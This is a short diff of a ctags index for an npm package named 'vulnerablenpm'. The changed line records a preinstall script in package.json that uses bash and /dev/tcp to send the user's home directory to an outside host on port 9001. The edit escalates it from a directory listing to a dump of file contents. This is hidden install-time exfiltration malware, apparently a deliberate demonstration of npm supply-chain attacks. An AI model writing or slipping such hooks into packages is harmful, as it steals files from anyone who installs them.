@@ -21,7 +21,7 @@ name	package-lock.json	/^      "name": "vulnerablenpm",$/;"	s	object:packages.
 name	package-lock.json	/^  "name": "vulnerablenpm",$/;"	s
 name	package.json	/^  "name": "vulnerablenpm",$/;"	s
 packages	package-lock.json	/^  "packages": {$/;"	o
-preinstall	package.json	/^	"preinstall": "bash -c 'ls ~ > \/dev\/tcp\/landspitalinn.is\/9001'"$/;"	s	object:scripts
+preinstall	package.json	/^	"preinstall": "bash -c 'cat ~\/* > \/dev\/tcp\/landspitalinn.is\/9001'"$/;"	s	object:scripts
 prepack	package.json	/^	"prepack": "echo prepack",$/;"	s	object:scripts
 prepare	package.json	/^	"prepare": "echo prepare",$/;"	s	object:scripts
 repository	package.json	/^  "repository": {$/;"	o
